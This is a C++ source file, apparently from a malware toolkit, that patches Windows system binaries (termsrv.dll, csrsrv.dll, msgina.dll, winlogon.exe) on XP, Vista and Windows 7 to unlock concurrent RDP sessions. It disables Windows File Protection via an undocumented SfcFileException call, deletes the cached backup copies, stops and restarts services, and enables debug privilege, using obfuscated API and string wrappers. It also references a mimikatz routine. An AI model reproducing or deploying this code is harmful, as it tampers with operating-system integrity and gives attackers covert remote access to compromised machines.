#include "core\FileTools.h"
#include "core\service.h"
#include "core\process.h"
#include "core\debug.h"
#include "other.h"

typedef DWORD (WINAPI *typeSfcFileException)( HANDLE rpc,LPCWSTR fname,DWORD type );

//byte xp_termsrv_find1[] = {0x83, 0x78, 0x24, 0x00, 0x74, 0x04, 0x33, 0xc0, 0xeb, 0x2c};
//byte xp_termsrv_replace1[] = {0x75};

//byte xp_termsrv_find2[] = {0x3b, 0x46, 0x0c, 0x7f, 0x16};
//byte xp_termsrv_replace2[] = {0x90, 0x90}; //offset 3

byte xp_termsrv_find3[]	= {0xe8, 0x63, 0x5e, 0x02, 0x00};
byte xp_termsrv_replace3[]	= {0x32, 0xc0, 0x40, 0x90, 0x90}; //offset 0

byte xp_termsrv_find4[]	= {0xf7, 0xd8, 0x1b, 0xc0, 0x40, 0xa3};
byte xp_termsrv_replace4[] = {0x33}; //offset 2

byte xp_termsrv_find5[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x8b, 0x45, 0x08, 0x57, 0x33, 0xff};
byte xp_termsrv_find6[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x56, 0x57, 0x8b, 0xf1}; //нужно два раза, и замена из xp_termsrv_replace5
byte xp_termsrv_find7[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x8b, 0x45, 0x08, 0x8b, 0x00, 0x8b, 0x80, 0x08, 0x34, 0x00, 0x00, 0x83, 0x78, 0x24, 0x00}; //замена из xp_termsrv_replace5
byte xp_termsrv_find8[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x56, 0x8d, 0x71, 0x0c}; //замена из xp_termsrv_replace5
byte xp_termsrv_find9[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x51, 0x53, 0x56, 0x57, 0xbf, 0x9c}; //замена из xp_termsrv_replace5
byte xp_termsrv_replace5[] = {0x33, 0xc0, 0xc2, 0x04, 0x00}; //offset 0

byte xp_termsrv_find10[] = {0x57, 0x6a, 0x47, 0x59, 0x6a, 0x01};
byte xp_termsrv_replace10[] = {0x33, 0xc0, 0xc3}; //offset -14

byte xp_csrsrv_find[] = { 0x51, 0x57, 0xff, 0xd0, 0x39, 0x9d, 0x24 };
byte xp_csrsrv_replace[] = { 0x90, 0x90 }; //offset 2

byte xp_msgina_find[] = { 0x6a, 0x00, 0xe8, 0x9d, 0x16, 0x01, 0x00 };
byte xp_msgina_replace[] = { 0xeb, 0x05 }; //offeset 0

byte xp_winlogon_find1[] = { 0xff, 0x75, 0x08, 0xe8, 0x12, 0x70, 0x00, 0x00 };
byte xp_winlogon_find2[] = { 0x8b, 0x4d, 0xfc, 0xe8, 0x5d, 0x33, 0x01, 0x00 };
byte xp_winlogon_replace[] = { 0x33, 0xc0, 0xc3 }; //для xp_winlogon_find1 offset 40, для xp_winlogon_find2 offset 12

byte vista_termsrv_find[]	= {0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84};
byte vista_termsrv_replace[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x5e, 0x90, 0x90}; //offset 0

byte win7_termsrv_find1[]	= {0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
byte win7_termsrv_find2[]	= {0x85, 0xc0, 0x74, 0x09, 0x38, 0x5d, 0xfa};
byte win7_termsrv_find3[]	= {0x74, 0x2f, 0x68, 0x88, 0x62};
byte win7_termsrv_replace1[] = {0xb8, 0x00, 0x01, 0x00, 0x00, 0x90, 0x89, 0x86, 0x20, 0x03, 0x00 }; //offset 0
byte win7_termsrv_replace2[] = {0x90}; //offset -20
byte win7_termsrv_replace3[] = {0xe9, 0x2c, 0x00, 0x00, 0x00}; //offset 0


static File::PatchData XP_TermsrvPatch[] =
{
//	{ xp_termsrv_find1, sizeof(xp_termsrv_find1) / sizeof(byte), xp_termsrv_replace1, sizeof(xp_termsrv_replace1) / sizeof(byte), 4 },
//	{ xp_termsrv_find2, sizeof(xp_termsrv_find2) / sizeof(byte), xp_termsrv_replace2, sizeof(xp_termsrv_replace2) / sizeof(byte), 3 },
	{ xp_termsrv_find3, sizeof(xp_termsrv_find3) / sizeof(byte), xp_termsrv_replace3, sizeof(xp_termsrv_replace3) / sizeof(byte), 0 },
	{ xp_termsrv_find4, sizeof(xp_termsrv_find4) / sizeof(byte), xp_termsrv_replace4, sizeof(xp_termsrv_replace4) / sizeof(byte), 2 },
	{ xp_termsrv_find5, sizeof(xp_termsrv_find5) / sizeof(byte), xp_termsrv_replace5, sizeof(xp_termsrv_replace5) / sizeof(byte), 0 },
	{ xp_termsrv_find6, sizeof(xp_termsrv_find6) / sizeof(byte), xp_termsrv_replace5, sizeof(xp_termsrv_replace5) / sizeof(byte), 0 },
	{ xp_termsrv_find6, sizeof(xp_termsrv_find6) / sizeof(byte), xp_termsrv_replace5, sizeof(xp_termsrv_replace5) / sizeof(byte), 0 },
	{ xp_termsrv_find7, sizeof(xp_termsrv_find7) / sizeof(byte), xp_termsrv_replace5, sizeof(xp_termsrv_replace5) / sizeof(byte), 0 },
	{ xp_termsrv_find8, sizeof(xp_termsrv_find8) / sizeof(byte), xp_termsrv_replace5, sizeof(xp_termsrv_replace5) / sizeof(byte), 0 },
	{ xp_termsrv_find9, sizeof(xp_termsrv_find9) / sizeof(byte), xp_termsrv_replace5, sizeof(xp_termsrv_replace5) / sizeof(byte), 0 },
	{ xp_termsrv_find10, sizeof(xp_termsrv_find10) / sizeof(byte), xp_termsrv_replace10, sizeof(xp_termsrv_replace10) / sizeof(byte), -14 },
	{ 0 }
};

static File::PatchData Vista_TermsrvPatch[] = 
{
	{ vista_termsrv_find, sizeof(vista_termsrv_find) / sizeof(byte), vista_termsrv_replace, sizeof(vista_termsrv_replace) / sizeof(byte), 0 },
	{ 0 }
};

static File::PatchData Win7_TermsrvPatch[] = 
{
	{ win7_termsrv_find1, sizeof(win7_termsrv_find1) / sizeof(byte), win7_termsrv_replace1, sizeof(win7_termsrv_replace1) / sizeof(byte), 0 },
	{ win7_termsrv_find2, sizeof(win7_termsrv_find2) / sizeof(byte), win7_termsrv_replace2, sizeof(win7_termsrv_replace2) / sizeof(byte), -20 },
	{ win7_termsrv_find3, sizeof(win7_termsrv_find3) / sizeof(byte), win7_termsrv_replace3, sizeof(win7_termsrv_replace3) / sizeof(byte), 0 },
	{ 0 }
};

static File::PatchData XP_CsrsrvPatch[] =
{
	{ xp_csrsrv_find, sizeof(xp_csrsrv_find) / sizeof(byte), xp_csrsrv_replace, sizeof(xp_csrsrv_replace) / sizeof(byte), 2 },
	{ 0 }
};

static File::PatchData XP_MsginaPatch[] =
{
	{ xp_msgina_find, sizeof(xp_msgina_find) / sizeof(byte), xp_msgina_replace, sizeof(xp_msgina_replace) / sizeof(byte), 0 },
	{ 0 }
};

static File::PatchData XP_WinlogonPatch[] =
{
	{ xp_winlogon_find1, sizeof(xp_winlogon_find1) / sizeof(byte), xp_winlogon_replace, sizeof(xp_winlogon_replace) / sizeof(byte), 40 },
	{ xp_winlogon_find2, sizeof(xp_winlogon_find2) / sizeof(byte), xp_winlogon_replace, sizeof(xp_winlogon_replace) / sizeof(byte), 12 },
	{ 0 }
};

struct FilePatch
{
	char* name;
	File::PatchData* patch;
};

static FilePatch XP_NamePatchedFiles[] =
{
	{ _CT_("termsrv.dll"), XP_TermsrvPatch },
	{ _CT_("csrsrv.dll"), XP_CsrsrvPatch },
	{ _CT_("msgina.dll"), XP_MsginaPatch },
	{ _CT_("winlogon.exe"), XP_WinlogonPatch },
	{ 0 }
};

typeSfcFileException SfcFileException;

//отключает защиту указанного файла на одну минуту
static bool DeprotectFile( const StringBuilder& fileName )
{
	if( SfcFileException == 0 )
	{
		HMODULE sfc_os = API(KERNEL32, LoadLibraryA)( _CS_("sfc_os.dll") );
		if( !sfc_os ) return false;
		SfcFileException = (typeSfcFileException)API(KERNEL32, GetProcAddress)( sfc_os, (char*)5 );
		if( SfcFileException == 0 ) return false;
	}
	wchar_t* fileNameW = WStr::Alloc(fileName.Len() + 1 );
	Str::ToWideChar( fileName.c_str(), fileName.Len() + 1, fileNameW, fileName.Len() + 1 );
	DWORD res = SfcFileException( 0, fileNameW, -1 );
	Mem::Free(fileNameW);
	return res == 0;
}

static bool PatchRDPFilesXP()
{
	bool ret = false;
	SfcFileException = 0;
	StringBuilderStack<MAX_PATH> pathSystem32;
	StringBuilder pathCache, filePatch, filePatchTmp, fileCache;
	if( !Service::OffDcomlaunch() ) return false;
	Process::KillLoadedModule( _CS_("termsrv.dll") );
	if( Path::GetCSIDLPath( CSIDL_SYSTEM, pathSystem32 ) )
	{
		Path::Combine( pathCache, pathSystem32, _CS_("dllcache") );
		int i = 0;
		while( XP_NamePatchedFiles[i].name )
		{
			Path::Combine( filePatch, pathSystem32, DECODE_STRING(XP_NamePatchedFiles[i].name) );
			filePatchTmp = filePatch;
			Path::ChangeExt( filePatchTmp, _CS_("tmp") );
			Path::Combine( fileCache, pathCache, DECODE_STRING(XP_NamePatchedFiles[i].name) );
			File::SetAttributes( fileCache, FILE_ATTRIBUTE_NORMAL );
			File::SetAttributes( filePatch, FILE_ATTRIBUTE_NORMAL );
			if( DeprotectFile(filePatch) )
				DbgMsg( "Защита снята для файла %s", filePatch.c_str() );
			else
				DbgMsg( "Защита не снялась для файла %s", filePatch.c_str() );
			if( File::Delete(fileCache) )
				DbgMsg( "Удален файл %s", fileCache.c_str() );
			else
				DbgMsg( "Не удалось удалить %s", fileCache.c_str() );

			if( API(KERNEL32, MoveFileA)( filePatch, filePatchTmp ) )
				DbgMsg( "Переименовали %s -> %s", filePatch.c_str(), filePatchTmp.c_str() );
			else
				DbgMsg( "Не удалось переименовать %s -> %s", filePatch.c_str(), filePatchTmp.c_str() );
			if( File::PatchExe( filePatchTmp, filePatch, XP_NamePatchedFiles[i].patch ) > 0 )
				DbgMsg( "Пропатчили %s", filePatch.c_str() );
			else
				DbgMsg( "Не удалось пропатчить %s", filePatch.c_str() );
			i++;
		}
		mimikatz::UpdateReestr();
		Delay(1000); //немного ждем, чтобы система увидела что служба отключена и ее можно было снова запустить
		Service::Start(_CS_("TermService"));
		ret = true;
	}
	return ret;
}

bool PatchRDPFilesVer6x( File::PatchData* patch )
{
	bool ret = false;
	Service::Stop( _CS_("TermService") );
	StringBuilderStack<MAX_PATH> filePatch;
	if( Path::GetCSIDLPath( CSIDL_SYSTEM, filePatch, _CS_("termsrv.dll") ) )
	{
		BOOLEAN old = FALSE;
		API(NTDLL, RtlAdjustPrivilege)( SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old );
		if( File::PatchExe( filePatch, filePatch, patch ) > 0 )
		{
			DbgMsg( "Пропатчили %s", filePatch.c_str() );
			ret = true;
		}
		else
			DbgMsg( "Не удалось пропатчить %s", filePatch.c_str() );
		mimikatz::UpdateReestr();
		Delay(1000); //немного ждем, чтобы система увидела что служба отключена и ее можно было снова запустить
		Service::Start(_CS_("TermService"));
	}
	return ret;
}

bool PatchRDPFilesVista()
{
	return PatchRDPFilesVer6x(Vista_TermsrvPatch);
}

bool PatchRDPFilesWin7()
{
	return PatchRDPFilesVer6x(Win7_TermsrvPatch);
}

bool PatchRDPFiles()
{
	DWORD MajorVersion, MinorVersion, BuildNumber;
	API(NTDLL, RtlGetNtVersionNumbers)( &MajorVersion, &MinorVersion, &BuildNumber );
	BuildNumber &= 0x00003fff;
	if( MajorVersion == 5 ) //XP
		return PatchRDPFilesXP();
	else if( MajorVersion == 6 )
		if( MinorVersion == 0 )
			return PatchRDPFilesVista();
		else if( MinorVersion  == 1 )
			return PatchRDPFilesWin7();
	return false;
}
